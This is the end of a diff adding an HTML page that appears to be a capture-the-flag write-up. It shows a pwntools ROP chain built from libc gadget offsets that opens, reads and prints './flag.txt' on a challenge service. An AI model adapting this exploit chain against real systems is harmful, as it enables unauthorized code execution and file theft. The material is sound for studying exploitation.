+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x90529</span><span class="p">)</span>  <span class="c1"># pop rdx; pop rbx</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x91396</span><span class="p">)</span>  <span class="c1"># syscall(2, &quot;./flag.txt&quot;, 0, 0)</span>
+
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x2a3e5</span><span class="p">)</span>  <span class="c1"># pop rdi</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>  <span class="c1"># Assume fd is 3</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x13f687</span><span class="p">)</span>  <span class="c1"># pop rsi</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rip</span> <span class="o">-</span> <span class="mh">0x20</span><span class="p">)</span>  <span class="c1"># Some valid memory</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x90529</span><span class="p">)</span>  <span class="c1"># pop rdx; pop rbx</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x50</span><span class="p">)</span>  <span class="c1"># nbytes</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">read</span><span class="p">)</span>  <span class="c1"># read(3, buf, 0x50)</span>
+
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x2a3e5</span><span class="p">)</span>  <span class="c1"># pop rdi</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>  <span class="c1"># Switch to stdout, rsi and rdx are preserved</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">write</span><span class="p">)</span>  <span class="c1"># write(1, buf, 0x50)</span>
+
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;./flag.txt</span><span class="se">\x00</span><span class="s2">&quot;</span>
+
+<span class="n">write_letter</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+            </div>
+        
+        
+    </div>
+
+    </body>
+</html>
